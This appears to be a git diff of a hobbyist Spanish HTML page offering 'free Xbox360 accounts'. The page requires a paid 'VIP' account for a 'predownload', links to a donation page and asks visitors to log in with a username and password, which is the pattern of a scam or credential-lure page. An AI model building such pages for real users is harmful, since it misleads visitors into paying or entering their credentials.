@@ -1,47 +1,43 @@
-﻿<!DOCTYPE html>
+<!DOCTYPE html>
 <html dir="ltr" lang="en">
   <head>
     <meta http-equiv="content-type" content="text/html; charset=UTF-8">
-    <title>Home</title>
+    <title>Autorizacion</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="login.css">
+    <script defer="defer" src="login.js"></script>
   </head>
-  <body style="        background-color: #002c00;">
+  <body style="              background-color: #002c00;">
     <title></title>
-    <script defer src="login.js"></script>
-    <div style="text-align: center; background-color: #002c00;"> <img src="Images/descarga.png"
+    <div style="text-align: center; background-color: #002c00;"> <img src="file:///C:/Users/Cesar/Downloads/Images/descarga.png"
 
         alt="xboxlogo" title="xboxlogo" style="width: 256px; height: 272px;"></div>
     <div style="text-align: center; background-color: #002c00;"> <br>
-      <h1><span style="font-family: Arial;"><span style="color: white;"><b><code>CUENTAS
+      <h1 id="login-header"><span style="font-family: Arial;"><span style="color: white;"><b><code>CUENTAS
                 XBOX360</code></b></span></span></h1>
       <h4 style=" background-color: #002c00;"><span style="color: white;">Cuentas
           gratuitas de Xbox360 traidas por MoisesGamers19</span></h4>
-      <p><br>
-      </p>
       <p style="background-color: #002c00;"><span style="color: white;">ESTA
           PREDESCARGA REQUIERE UNA CUENTA VIP.. SI AUN NO TIENES UNA HAS CLICK <a
 
             href="https://oceangamer.github.io/CuentasXbox360/Donate.html#" target="_blank">AQUI</a><br>
         </span></p>
-      <p><br>
-      </p>
       <h1><span style="color: white;"><span style="font-family: Arial Rounded MT;">AUTORIZACION
             PARA PREDESCARGA</span><br>
         </span></h1>
-      <div id="login-error-msg-holder">
-      <h1><span style="color: red;"><span style="font-family: Arial Rounded MT;">USUARIO O CONTRASEÑA INCORRECTA</span><br>
-    </div>
-      <meta charset="utf-8">
-      <link rel="stylesheet" href="style.css">
-      <section class="form-login">
-        <form id="login-form">
-        <input class="controls" name="usuario" value="" id="username-field" placeholder="Usuario" type="text">
-        <input class="controls" name="password" value="" id="password-field" placeholder="Contraseña" type="password">
-        <input class="buttons" name="" value="Ingresar" onclick="login()" type="submit">
-        <button type="button" id="login-form-submit" value="Continuar"</button>
-        </form>
-      </section>
       <p><br>
       </p>
+      <title>LOGIN DE CUENTA VIP</title>
+      <h1><b><span style="color: white;">Login</span></b> </h1>
+      <div style="text-align: center;">
+        <form id="login-form"> 
+          <input name="link" value="patata.com" id="link-field" type="hidden">
+          <input name="username" id="username-field" class="login-form-field" placeholder="Username" type="text">
+          <input name="password" id="password-field" class="login-form-field" placeholder="Password" type="password">
+          <input value="Login" id="login-form-submit" type="submit"> 
+        </form>
+      </div>
       <address><br>
         <br>
         <b><span style="color: white;">OceanGamer and MoisesGamers19 (c) 2022<br>
@@ -49,6 +45,5 @@
           </span></b> </address>
       <h6> </h6>
     </div>
-    
   </body>
 </html>
